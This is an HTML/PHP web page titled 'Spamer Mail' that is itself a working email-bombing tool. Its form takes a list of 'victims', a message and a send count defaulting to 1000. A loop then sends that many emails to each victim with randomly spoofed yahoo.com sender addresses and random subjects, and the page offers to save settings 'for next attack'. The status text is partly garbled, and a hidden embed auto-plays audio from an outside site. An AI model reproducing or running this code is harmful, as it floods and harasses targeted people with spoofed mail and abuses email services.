<HTML><HEAD><TITLE>Spamer Mail - NetViet.MoBi</TITLE>
<STYLE type=text/css>.style1 {
   COLOR: #ff0000
}
.style2 {
   COLOR: gray
}
body{
font-size: 11px;
}
A:link {
   COLOR: #999999
}
A:visited {
   COLOR: #999999
}
A:hover {
   COLOR: #999999
}
A:active {
   COLOR: #999999
}
.style3 {
   FONT-FAMILY: "Courier New", Courier, mono
}
div.Section1
   {page:Section1;}
span.SpellE
   {}
span.GramE
   {}

      .result {padding : 2px 4px 0 4px;}

      .BAB_CPBodyStyleLocal
      {
        padding : 0;
        margin-left: 2pt;
        margin-right: 2pt;
      }

      .full-text-translation { padding : 4px;   margin: 0 -2pt; }

</STYLE>

</HEAD>
<BODY text=#00ff00 bgColor=#000000>
<DIV align=center>

<P></P>
<CENTER>
<DIV id=fader 
   <FONT 
color=#999999>
<H2><font face="Arial Black" size="6"><span class="style1"><strong>
<font color="#00FF00">&nbsp;</font></strong></span></font></H2>
  </FONT>
   <FONT 
color=#00ff00>


   <H3><font face="Times New Roman"><b><font face="tahoma" size="5">====</font></b></font><strong><font face="Courier New, Courier, mono" size="6">Waptok.Asia</font></strong><font face="Times New Roman"><b><font face="tahoma" size="5">====</font></b></font></H3>
<H3></H3>
<H1>&nbsp;</H1>
  </FONT>
<?php
$message_default = "No.1 Spamer";

$number_default = 1000;

$notice = "";
$erremail = "";
$errnum = "";

if(isset($_POST["victims"])) {
$message = $_POST["message"];
$victims = $_POST["victims"];
$victims = explode("\n", $victims);
$number = $_POST["number"];
$save = $_POST["save"];

$senddate = (date("d M Y h:m:s -0500"));

if($save == "yes") {
$message_default = $message;
$number_default = $number;

}

//Send email
for($i=0; $i<count($victims); $i++) {
$victim = trim($victims[$i]);

if($i<count($victims)-1) $notice.= $victim.", ";
else $notice.= $victim;

for($j=0; $j<$number; $j++) {
$spam = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
$from = $spam[rand(0,35)].$spam[rand(0,35)].$spam[rand(0,35)].$spam[rand(0,35)]."@yahoo.com";
$extraheaders = "From: $from" . "\nContent-Type: text/html\n";
$subject = rand(1,10).rand(1,100).rand(1,1000).rand(1,10000).rand(0,100000);
@mail("$victim", "$subject", "$message", $extraheaders);
}
}
$notice.= " => paling rencana untuk merajut".$number." la?n , la?m die?u thuo?c ch?i di!!";
$laydulieu = $_POST["victims"];
$kiemtra = preg_match("/\@/", $laydulieu);
if ($kiemtra == 0) {
$errmail = "Korban Email dapat rusak atau
tidak benar, jadi gagal, periksa
kembali!";
$notice = "";
}
}
?>
<form method="POST"><br>
<font color='red'><?=$errmail;?></font><br>
<FONT face="Arial Black" color=#FFFF00 size=7><STRONG>N</STRONG>umber of emails to send:</STRONG></FONT><br>
<font color='blue'><?=$errnum;?></font><br>
<input type="number" name="number" min="1" max="7"size="4" value="<?=$number_default;?>" style="text-align: center;" /> <br />

<FONT face="Arial Black" color=#FFFF00 size=7><STRONG>V</STRONG>ictim:</STRONG></FONT><br />
<textarea name="victims" cols="40" rows="6" /><?php
if(isset($victims) && $save=="yes") {
for($i=0; $i<count($victims); $i++) {
if($i<count($victims)-1) echo trim($victims[$i])."\n";
else echo trim($victims[$i]);
}
}
?></textarea> <br />

<FONT face="Arial Black" color=#FFFF00 size=5><STRONG>M</STRONG>essage:</STRONG></FONT><br><br />
<textarea name="message" cols="40" rows="4" /><?=$message_default;?></textarea> <br />

Save all contents for next attack:
Yes <input type="radio" name="save" value="yes" <?php if($save=="yes") echo "checked"; if(!isset($save)) echo "checked";?> />
No <input type="radio" name="save" value="no" <?php if($save=="no") echo "checked";?> /> <br />


<input type="submit" name="submit" value="Send" /><br> &nbsp; <font color='green'><?=$notice;?></font>
</form>
<FONT 
color=#C0C0C0>
   <p>
  </FONT>
   <b>
   <FONT 
color=#C0C0C0>
   .:</FONT><FONT 
color=#00ff00>
   </FONT>
   <FONT 
color=#FF0000>
   Sat</FONT><FONT 
color=#00ff00>&nbsp;&nbsp;
  </FONT>
   <FONT 
color=#C0C0C0>
   Cold</FONT><FONT 
color=#00ff00>&nbsp;&nbsp;
  </FONT>
   <FONT 
color=#FF0000>
   Blood</FONT><FONT 
color=#00ff00>&nbsp;
  </FONT>
   <FONT 
color=#C0C0C0>
   Tests</FONT></b><FONT 
color=#00ff00>
   </FONT>
   <b>
   <FONT 
color=#C0C0C0>
   :.</FONT><FONT 
color=#00ff00>
   </FONT>
   </b>
   <FONT 
color=#00ff00>
   </p>
   <p>&nbsp;</p>
   <p><b>!!!!!!!!!!!!!!!!!!</b></p>
  </FONT>

   <FONT 
color=#00ff00>
<P></P></DIV></CENTER><LAYER name="a0" left="10" top="10" visibility="show" 
bgcolor="#ffffff" clip="0,0,1,1"></LAYER><LAYER name="a1" left="10" top="10" 
visibility="show" bgcolor="#fff000" clip="0,0,1,1"></LAYER><LAYER name="a2" 
left="10" top="10" visibility="show" bgcolor="#ffa000" 
clip="0,0,1,1"></LAYER><LAYER name="a3" left="10" top="10" visibility="show" 
bgcolor="#ff00ff" clip="0,0,1,1"></LAYER><LAYER name="a4" left="10" top="10" 
visibility="show" bgcolor="#00ff00" clip="0,0,1,1"></LAYER><LAYER name="a5" 
left="10" top="10" visibility="show" bgcolor="#ff00ff" 
clip="0,0,1,1"></LAYER><LAYER name="a6" left="10" top="10" visibility="show" 
bgcolor="#ff0000" clip="0,0,1,1"></LAYER><LAYER name="a7" left="10" top="10" 
visibility="show" bgcolor="#ffffff" clip="0,0,1,1"></LAYER><LAYER name="a8" 
left="10" top="10" visibility="show" bgcolor="#fff000" 
clip="0,0,1,1"></LAYER><LAYER name="a9" left="10" top="10" visibility="show" 
bgcolor="#ffa000" clip="0,0,1,1"></LAYER><LAYER name="a10" left="10" top="10" 
visibility="show" bgcolor="#ff00ff" clip="0,0,1,1"></LAYER><LAYER name="a11" 
left="10" top="10" visibility="show" bgcolor="#00ff00" 
clip="0,0,2,2"></LAYER><LAYER name="a12" left="10" top="10" visibility="show" 
bgcolor="#0000ff" clip="0,0,2,2"></LAYER><LAYER name="a13" left="10" top="10" 
visibility="show" bgcolor="#ff0000" clip="0,0,2,2"><LAYER name="a14" left="10" 
top="10" visibility="show" bgcolor="#FFFFFF" clip="0,0,2,2">
<CENTER>
<p></p>
</CENTER>
<H4 align=center><span class="style3"><FONT color=red><BR></FONT> 
</span>
  </FONT>
<SPAN 
class=style3><FONT 
color=#999999>&nbsp;</FONT></SPAN></H4>
<H4 align=center><SPAN 
class=style3><FONT 
color=#00ff00>
<FONT face="Arial Black" color=#FF0000 size=5></FONT><br><a class="style2" target="_blank" href="http://waptok.asia">
<font color="#FF0000"><span style="text-decoration: none">www.</span></font><span style="text-decoration: none"><font color="#FFFFFF">waptok.</font></span><font color="#FF0000"><span style="text-decoration: none">asia</span></font></a></FONT><FONT 
color=#999999> </FONT> </SPAN><FONT 
color=#00ff00></H4></DIV></FONT></BODY></HTML>
<EMBED 
src=http://www.mehmetciklerimiz.info/tobe.mp3 hidden=true AUTOSTART="TRUE" 

LOOP="TRUE" width="1" height="1"> <NOEMBED><BGSOUND src="http://www.mehmetciklerimiz.info/tobe.mp" 

loop=infinite></NOEMBED></EMBED>

</font>

</font>

</body>

</html>